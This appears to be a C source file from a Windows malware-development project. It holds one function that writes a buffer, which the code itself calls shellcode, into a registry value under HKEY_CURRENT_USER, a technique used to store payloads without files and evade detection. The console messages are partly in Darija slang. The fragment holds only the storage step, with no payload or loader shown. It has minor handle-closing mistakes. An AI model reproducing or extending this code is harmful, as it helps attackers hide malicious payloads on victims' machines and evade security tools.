#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<winreg.h>
#include"func.h"


BOOL State = FALSE;
LSTATUS Lstatus;
HKEY mykey;

BOOL WrtiteToReg(IN PBYTE pShell, IN DWORD ShellSize) {

	printf("----------------_--- We are Writing to the Registry : %s ---_-------------------- \n", REG);
	printf("\n");
	printf("----------------_------------ PLEASE WAIT ------------_-------------------- \n");

	Lstatus = RegOpenKeyExA(HKEY_CURRENT_USER, REG, 0, KEY_ALL_ACCESS, &mykey);

	if (Lstatus != ERROR_SUCCESS) {
		printf("------------------------- Mafihach 7anoni , Error on opening the Key -------------- \n ");
		RegCloseKey(mykey);
		return FALSE;

	}

	Lstatus = RegSetValueExA(mykey, SUBREG, 0, REG_BINARY, pShell, ShellSize);

	if (Lstatus != ERROR_SUCCESS) {
		printf("------------------------- Mafihach 7anoni , Error on writing the shellcode -------------- \n ");
		RegCloseKey(mykey);
		return FALSE;

	}
	return TRUE;


}